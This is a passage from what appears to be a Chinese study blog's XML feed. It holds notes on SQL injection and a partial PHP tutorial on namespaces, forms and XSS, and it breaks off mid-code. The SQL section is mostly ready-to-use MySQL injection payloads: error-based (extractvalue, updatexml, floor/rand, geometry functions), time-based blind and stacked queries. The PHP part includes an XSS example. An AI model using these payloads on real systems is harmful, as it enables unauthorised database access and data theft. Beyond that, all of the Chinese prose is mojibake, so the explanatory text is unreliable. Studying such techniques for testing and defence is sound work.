href="#likeåŒ¹é…æ³¨å…¥">ğŸ­</a>likeåŒ¹é…æ³¨å…¥</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ro%&#x27;</span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥"><a class="header-anchor" href="#æŠ¥é”™æ³¨å…¥">ğŸ­</a>æŠ¥é”™æ³¨å…¥</h3><h4 id="floor-å’Œrand"><a class="header-anchor" href="#floor-å’Œrand">ğŸ­</a>floor()å’Œrand()</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),<span class="hljs-number">2</span>,concat(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;:&#x27;</span>,floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a   //åˆ©ç”¨é”™è¯¯ä¿¡æ¯å¾—åˆ°å½“å‰æ•°æ®åº“å</code></pre><h4 id="extractvalue"><a class="header-anchor" href="#extractvalue">ğŸ­</a>extractvalue()</h4><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e))</code></pre><h4 id="updatexml"><a class="header-anchor" href="#updatexml">ğŸ­</a>updatexml()</h4><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)</code></pre><h4 id="geometrycollection"><a class="header-anchor" href="#geometrycollection">ğŸ­</a>geometrycollection()</h4><pre><code class="hljs n1ql">id=1 and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multipoint"><a class="header-anchor" href="#multipoint">ğŸ­</a>multipoint()</h4><pre><code class="hljs n1ql">id=1 and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="polygon"><a class="header-anchor" href="#polygon">ğŸ­</a>polygon()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multipolygon"><a class="header-anchor" href="#multipolygon">ğŸ­</a>multipolygon()</h4><pre><code class="hljs n1ql">id=1 and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="linestring"><a class="header-anchor" href="#linestring">ğŸ­</a>linestring()</h4><pre><code class="hljs n1ql">id=1 and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="multilinestring"><a class="header-anchor" href="#multilinestring">ğŸ­</a>multilinestring()</h4><pre><code class="hljs n1ql">id=1 and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))</code></pre><h4 id="exp"><a class="header-anchor" href="#exp">ğŸ­</a>exp()</h4><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))</code></pre><h3 id="æ—¶é—´æ³¨å…¥"><a class="header-anchor" href="#æ—¶é—´æ³¨å…¥">ğŸ­</a>æ—¶é—´æ³¨å…¥</h3><pre><code class="hljs apache"><span class="hljs-attribute">If</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)) --+//å¦‚æœå‰é¢æ‰§è¡Œçš„æ­£ç¡®æ‰§è¡Œ<span class="hljs-number">0</span>å°±ä¸ºå‡ ,å¦‚æœå‰é¢é”™è¯¯åˆ™æ‰§è¡Œåé¢sleep(<span class="hljs-number">5</span>)å»¶è¿Ÿ<span class="hljs-number">5</span>ç§’</code></pre><h3 id="å †å æŸ¥è¯¢æ³¨å…¥"><a class="header-anchor" href="#å †å æŸ¥è¯¢æ³¨å…¥">ğŸ­</a>å †å æŸ¥è¯¢æ³¨å…¥</h3><pre><code class="hljs apache"><span class="hljs-attribute">id</span> = <span class="hljs-number">1</span>&#x27;;select if(sub(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;r&#x27;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span></code></pre><h3 id="äºŒæ¬¡æ³¨å…¥"><a class="header-anchor" href="#äºŒæ¬¡æ³¨å…¥">ğŸ­</a>äºŒæ¬¡æ³¨å…¥</h3><p><img src="/2020/11/08/SQL/%E5%95%A6%E5%95%A6%E5%95%A6.jpg" alt="å•¦å•¦å•¦"></p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a class="header-anchor" href="#å®½å­—èŠ‚æ³¨å…¥">ğŸ­</a>å®½å­—èŠ‚æ³¨å…¥</h3><p><img src="/2020/11/08/SQL/%E5%93%88%E5%93%88%E5%93%88.jpg" alt="å“ˆå“ˆå“ˆ"></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php(ä¸‰)</title>
    <link href="/2020/11/04/php(%E4%B8%89)/"/>
    <url>/2020/11/04/php(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h1>PHPï¼ˆä¸‰ï¼‰</h1><ul><li><a href="#php%E4%B8%89">PHPï¼ˆä¸‰ï¼‰</a><ul><li><a href="#php-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4">PHP å‘½åç©ºé—´</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">å®šä¹‰</a></li></ul></li><li><a href="#php%E8%A1%A8%E5%8D%95">phpè¡¨å•</a><ul><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%8D%95%E9%80%89">PHP ä¸‹æ‹‰èœå•å•é€‰</a></li><li><a href="#php-%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95%E5%A4%9A%E9%80%89">PHP ä¸‹æ‹‰èœå•å¤šé€‰</a></li></ul></li><li><a href="#php-%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">PHP è¡¨å•éªŒè¯</a><ul><li><a href="#php-%E9%AA%8C%E8%AF%81%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE">PHP éªŒè¯è¡¨å•æ•°æ®</a></li><li><a href="#php-%E8%A1%A8%E5%8D%95---%E5%BF%85%E9%9C%80%E5%AD%97%E6%AE%B5">PHP è¡¨å• - å¿…éœ€å­—æ®µ</a></li></ul></li><li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E4%BB%B6%E5%92%8Curl">éªŒè¯é‚®ä»¶å’ŒURL</a><ul><li><a href="#php---%E9%AA%8C%E8%AF%81%E5%90%8D%E7%A7%B0">PHP - éªŒè¯åç§°</a></li></ul></li><li><a href="#php-%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84">PHP å¤šç»´æ•°ç»„</a></li><li><a href="#date-%E5%87%BD%E6%95%B0">date() å‡½æ•°</a></li><li><a href="#php-%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6">PHP åŒ…å«æ–‡ä»¶</a><ul><li><a href="#include-%E5%92%8C-require-%E8%AF%AD%E5%8F%A5">include å’Œ require è¯­å¥:</a></li></ul></li><li><a href="#php-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">PHP æ–‡ä»¶å¤„ç†</a><ul><li><a href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6">æ‰“å¼€æ–‡ä»¶</a></li><li><a href="#feof-%E5%87%BD%E6%95%B0">feof() å‡½æ•°</a></li></ul></li><li><a href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">PHPæ–‡ä»¶ä¸Šä¼ </a><ul><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC">åˆ›å»ºä¸Šä¼ è„šæœ¬</a></li></ul></li><li><a href="#php-cookie">PHP Cookie</a></li><li><a href="#php-session">PHP Session</a></li><li><a href="#php-%E5%8F%91%E9%80%81%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6">PHP å‘é€ç”µå­é‚®ä»¶</a><ul><li><a href="#php-mail-%E5%87%BD%E6%95%B0">PHP mail() å‡½æ•°</a></li><li><a href="#php-e-mail-%E6%B3%A8%E5%85%A5">PHP E-mail æ³¨å…¥</a></li></ul></li><li><a href="#php-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">PHP é”™è¯¯å¤„ç†</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-die-%E5%87%BD%E6%95%B0">ä½¿ç”¨ die() å‡½æ•°</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯å¤„ç†å™¨</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">è®¾ç½®é”™è¯¯å¤„ç†ç¨‹åº</a></li><li><a href="#%E8%A7%A6%E5%8F%91%E9%94%99%E8%AF%AF-trigger_error">è§¦å‘é”™è¯¯ï¼š trigger_error()</a></li><li><a href="#%E9%94%99%E8%AF%AF%E8%AE%B0%E5%BD%95">é”™è¯¯è®°å½•</a></li></ul></li><li><a href="#php-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">PHP å¼‚å¸¸å¤„ç†</a><ul><li><a href="#trythrow-%E5%92%8C-catch">Tryã€throw å’Œ catch</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-exception-%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BA%86-php-%E7%9A%84-exception-%E7%B1%BB%E7%9A%84%E6%89%80%E6%9C%89%E5%B1%9E%E6%80%A7%E5%8F%AF%E5%90%91%E5%85%B6%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E5%87%BD%E6%95%B0">åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ Exception ç±»ï¼ˆç»§æ‰¿äº† PHP çš„ exception ç±»çš„æ‰€æœ‰å±æ€§ï¼Œå¯å‘å…¶æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼‰</a></li></ul></li><li><a href="#php-%E8%BF%87%E6%BB%A4%E5%99%A8">PHP è¿‡æ»¤å™¨</a><ul><li><a href="#%E9%AA%8C%E8%AF%81%E8%BE%93%E5%85%A5">éªŒè¯è¾“å…¥</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E5%A4%9A%E4%B8%AA%E8%BE%93%E5%85%A5filter_var_array-%E6%88%96-the-filter_input_array">è¿‡æ»¤å¤šä¸ªè¾“å…¥ï¼šfilter_var_array æˆ– the filter_input_array</a></li><li><a href="#filter-callback">Filter Callback</a></li></ul></li><li><a href="#php-json">PHP JSON</a><ul><li><a href="#json_encode%E7%94%A8%E4%BA%8E%E5%AF%B9%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C-json-%E7%BC%96%E7%A0%81">json_encodeï¼šç”¨äºå¯¹å˜é‡è¿›è¡Œ JSON ç¼–ç </a></li><li><a href="#%E5%B0%86-php-%E5%AF%B9%E8%B1%A1%E8%BD%AC%E6%8D%A2%E4%B8%BA-json-%E6%A0%BC%E5%BC%8F%E6%95%B0%E6%8D%AE">å°† PHP å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼æ•°æ®</a></li><li><a href="#json_decode">json_decode</a></li></ul></li></ul></li></ul><h2 id="PHP-å‘½åç©ºé—´"><a class="header-anchor" href="#PHP-å‘½åç©ºé—´">ğŸ­</a>PHP å‘½åç©ºé—´</h2><h4 id="å®šä¹‰"><a class="header-anchor" href="#å®šä¹‰">ğŸ­</a>å®šä¹‰</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">// å®šä¹‰ä»£ç åœ¨ &#x27;MyProject&#x27; å‘½åç©ºé—´ä¸­  </span><span class="hljs-keyword">namespace</span> <span class="hljs-title">MyProject</span>;   <span class="hljs-comment">// ... ä»£ç  ...  </span></code></pre><p>å¯ä»¥åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸åŒçš„å‘½åç©ºé—´ä»£ç ã€‚å…¨å±€ä»£ç å¿…é¡»ç”¨ä¸€ä¸ªä¸å¸¦åç§°çš„ namespace è¯­å¥åŠ ä¸Šå¤§æ‹¬å·æ‹¬èµ·æ¥ã€‚ declare æ˜¯å”¯ä¸€å¯ä»¥æ”¾åœ¨å‘½åç©ºé—´å‰çš„è¯­å¥ã€‚æ‰€æœ‰é PHP ä»£ç åŒ…æ‹¬ç©ºç™½ç¬¦éƒ½ä¸èƒ½å‡ºç°åœ¨å‘½åç©ºé—´çš„å£°æ˜ä¹‹å‰ã€‚</p><h2 id="phpè¡¨å•"><a class="header-anchor" href="#phpè¡¨å•">ğŸ­</a>phpè¡¨å•</h2><h4 id="PHP-ä¸‹æ‹‰èœå•å•é€‰"><a class="header-anchor" href="#PHP-ä¸‹æ‹‰èœå•å•é€‰">ğŸ­</a>PHP ä¸‹æ‹‰èœå•å•é€‰</h4><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$q = <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;q&#x27;</span>])? htmlspecialchars($_GET[<span class="hljs-string">&#x27;q&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="php"><span class="hljs-keyword">if</span>($q) &#123;</span><span class="php">        <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;JD&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;äº¬ä¸œ&lt;br&gt;http://www.JD.com&#x27;</span>;</span><span class="php">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;baidu&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; ç™¾åº¦&lt;br&gt;http://www.baidu.com&#x27;</span>;</span><span class="php">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($q ==<span class="hljs-string">&#x27;TAOBAO&#x27;</span>) &#123;</span><span class="php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ·˜å®&lt;br&gt;http://www.taobao.com&#x27;</span>;</span><span class="php">        &#125;</span><span class="php">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>é€‰æ‹©ä¸€ä¸ªç«™ç‚¹:<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;JD&quot;</span>&gt;</span>JD<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;baidu&quot;</span>&gt;</span>baidu<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;TAOBAO&quot;</span>&gt;</span>Taobao<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æäº¤&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><h4 id="PHP-ä¸‹æ‹‰èœå•å¤šé€‰"><a class="header-anchor" href="#PHP-ä¸‹æ‹‰èœå•å¤šé€‰">ğŸ­</a>PHP ä¸‹æ‹‰èœå•å¤šé€‰</h4><p>è®¾ç½® select <strong>name=â€œq[]â€</strong> ä»¥æ•°ç»„çš„æ–¹å¼è·å–ã€‚</p><p>é‡‡ç”¨æ•°ç»„arry()å‡½æ•°ï¼Œå…¶ä½™ä»£ç ä¸å•é€‰ç±»ä¼¼ï¼š</p><pre><code class="hljs php">$q = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;q&#x27;</span>])? $_POST[<span class="hljs-string">&#x27;q&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(is_array($q)) &#123;    $sites = <span class="hljs-keyword">array</span>(            <span class="hljs-string">&#x27;JD&#x27;</span> =&gt; <span class="hljs-string">&#x27;äº¬ä¸œ: http://www.JD.com&#x27;</span>,            <span class="hljs-string">&#x27;baidu&#x27;</span> =&gt; <span class="hljs-string">&#x27; ç™¾åº¦: http://www.baidu.com&#x27;</span>,            <span class="hljs-string">&#x27;TAOBAO&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ·˜å®: http://www.taobao.com&#x27;</span>,    );    <span class="hljs-keyword">foreach</span>($q <span class="hljs-keyword">as</span> $val) &#123;        <span class="hljs-keyword">echo</span> $sites[$val] . PHP_EOL;</code></pre><p>å…¶ä¸­PHP_EOLè¡¨ç¤ºæ¢è¡Œã€‚</p><h2 id="PHP-è¡¨å•éªŒè¯"><a class="header-anchor" href="#PHP-è¡¨å•éªŒè¯">ğŸ­</a>PHP è¡¨å•éªŒè¯</h2><p>$_SERVER[â€œPHP_SELFâ€]æ˜¯è¶…çº§å…¨å±€å˜é‡ï¼Œè¿”å›å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œä¸ document rootç›¸å…³ã€‚<strong>å½“é»‘å®¢ä½¿ç”¨è·¨ç½‘ç«™è„šæœ¬çš„HTTPé“¾æ¥æ¥æ”»å‡»æ—¶ï¼Œè¯¥å‡½æ•°æœåŠ¡å™¨å˜é‡ä¹Ÿä¼šè¢«æ¤å…¥è„šæœ¬ã€‚åŸå› å°±æ˜¯è·¨ç½‘ç«™è„šæœ¬æ˜¯é™„åœ¨æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„åé¢çš„ï¼Œå› æ­¤å‡½æ•°çš„å­—ç¬¦ä¸²å°±ä¼šåŒ…å«HTTPé“¾æ¥åé¢çš„JavaScriptç¨‹åºä»£ç ã€‚</strong>(XSSåˆå« CSS (Cross-Site Script) ,è·¨ç«™è„šæœ¬æ”»å‡»ã€‚æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„htmlä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„htmlä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚)</p><p>$_SERVER[â€œPHP_SELFâ€] å¯ä»¥é€šè¿‡ <em><strong>htmlspecialchars()</strong></em> å‡½æ•°æ¥é¿å…è¢«åˆ©ç”¨ã€‚</p><pre><code class="hljs xml">&amp; ï¼ˆå’Œå·ï¼‰ æˆä¸º <span class="hljs-symbol">&amp;amp;</span>&quot; ï¼ˆåŒå¼•å·ï¼‰ æˆä¸º <span class="hljs-symbol">&amp;quot;</span>&#x27; ï¼ˆå•å¼•å·ï¼‰ æˆä¸º <span class="hljs-symbol">&amp;#039;</span><span class="hljs-tag">&lt; ï¼ˆå°äºï¼‰ æˆä¸º &amp;<span class="hljs-attr">lt</span>;</span><span class="hljs-tag">&gt;</span> ï¼ˆå¤§äºï¼‰ æˆä¸º <span class="hljs-symbol">&amp;gt;</span></code></pre><p>æ­£å¸¸ä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlspecialchars($_SERVER[<span class="hljs-string">&quot;PHP_SELF&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span></code></pre><p>htmlspecialchars() æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚å¯é¿å…è¯¥å‡½æ•°è¢«åˆ©ç”¨ã€‚</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;test_form.php/<span class="hljs-symbol">&amp;quot;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(&#x27;hacked&#x27;)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&quot;</span>&gt;</span></code></pre><h4 id="PHP-éªŒè¯è¡¨å•æ•°æ®"><a class="header-anchor" href="#PHP-éªŒè¯è¡¨å•æ•°æ®">ğŸ­</a>PHP éªŒè¯è¡¨å•æ•°æ®</h4><p>ç”¨æˆ·æäº¤çš„æ•°æ®é€šè¿‡ PHP çš„ htmlspecialchars() å‡½æ•°å¤„ç†ï¼Œä»£ç å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œè€Œä¼šè¢«ä¿å­˜ä¸ºHTMLè½¬ä¹‰ä»£ç ã€‚</p><p>å®ä¾‹ï¼š</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href(<span class="hljs-string">&#x27;http://www.JD.com&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>å¤„ç†åï¼š</p><pre><code class="hljs gams">&amp;<span class="hljs-keyword">lt</span>;script&amp;<span class="hljs-keyword">gt</span>;location.href(<span class="hljs-string">&#x27;http://www.JD.com&#x27;</span>)&amp;<span class="hljs-keyword">lt</span>;/script&amp;<span class="hljs-keyword">gt</span>;</code></pre><h4 id="PHP-è¡¨å•-å¿…éœ€å­—æ®µ"><a class="header-anchor" href="#PHP-è¡¨å•-å¿…éœ€å­—æ®µ">ğŸ­</a>PHP è¡¨å• - å¿…éœ€å­—æ®µ</h4><p>$nameErr, $emailErr, $genderErr, å’Œ $websiteErr.è¿™äº›é”™è¯¯å˜é‡æ˜¾ç¤ºåœ¨å¿…éœ€å­—æ®µä¸Šï¼Œåœ¨æ¯ä¸ª$_POSTå˜é‡ä¸­å¢åŠ äº†ä¸€ä¸ªif elseè¯­å¥ä»¥æ£€æŸ¥ å˜é‡æ˜¯ å¦ä¸ºç©ºï¼ˆä½¿ç”¨empty() å‡½æ•°ï¼‰å¦‚æœä¸ºç©ºï¼Œå°†æ˜¾ç¤ºå¯¹åº”çš„é”™è¯¯ä¿¡æ¯ï¼›å¦‚æœä¸ä¸ºç©ºï¼Œæ•°æ®å°†ä¼ é€’ç»™test_input() å‡½æ•°ã€‚</p><h2 id="éªŒè¯é‚®ä»¶å’ŒURL"><a class="header-anchor" href="#éªŒè¯é‚®ä»¶å’ŒURL">ğŸ­</a>éªŒè¯é‚®ä»¶å’ŒURL</h2><p><strong>int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] )</strong></p><p>åœ¨ subject å­—ç¬¦ä¸²ä¸­æœç´¢ä¸ pattern ç»™å‡ºçš„æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å†…å®¹ã€‚å¦‚æœæä¾›äº† matches ï¼Œåˆ™å…¶ä¼šè¢«æœç´¢çš„ç»“æœæ‰€å¡«å……ã€‚$matches[0] å°†åŒ…å«ä¸æ•´ä¸ªæ¨¡å¼åŒ¹é…çš„æ–‡æœ¬ï¼Œ$matches[1] å°†åŒ…å«ä¸ç¬¬ä¸€ä¸ªæ•è·çš„æ‹¬å·ä¸­çš„å­æ¨¡å¼æ‰€åŒ¹é…çš„æ–‡æœ¬ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><h4 id="PHP-éªŒè¯åç§°"><a class="header-anchor" href="#PHP-éªŒè¯åç§°">ğŸ­</a>PHP - éªŒè¯åç§°</h4><pre><code class="hljs powershell"><span class="hljs-variable">$name</span> = test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>]);<span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/^[a-zA-Z ]*<span class="hljs-variable">$</span>/&quot;</span>,<span class="hljs-variable">$name</span>)) &#123;  <span class="hljs-variable">$nameErr</span> = <span class="hljs-string">&quot;åªå…è®¸å­—æ¯å’Œç©ºæ ¼&quot;</span>; &#125;</code></pre><p>URL,E-mail,ä¸ä¸Šé¢ç±»ä¼¼ï¼›å°†preg_matchæ‹¬å·ä¸­æ›¿æ¢æˆ<code>(&quot;/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i&quot;,$website),(&quot;/([\w\-]+\@[\w\-]+\.[\w\-]+)/&quot;,$email)</code>å³å¯ã€‚</p><h2 id="PHP-å¤šç»´æ•°ç»„"><a class="header-anchor" href="#PHP-å¤šç»´æ•°ç»„">ğŸ­</a>PHP å¤šç»´æ•°ç»„</h2><p>åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ•°ç»„ï¼Œåœ¨å¤šç»´æ•°ç»„ä¸­ï¼Œä¸»æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå­æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-comment">// äºŒç»´æ•°ç»„:</span></span><span class="php">$cosmetic = <span class="hljs-keyword">array</span></span><span class="php">(</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YSL&quot;</span>,<span class="hljs-string">&quot;Dior&quot;</span>,<span class="hljs-string">&quot;CHANEL&quot;</span>),</span><span class="php">    <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;GUCCI&quot;</span>,<span 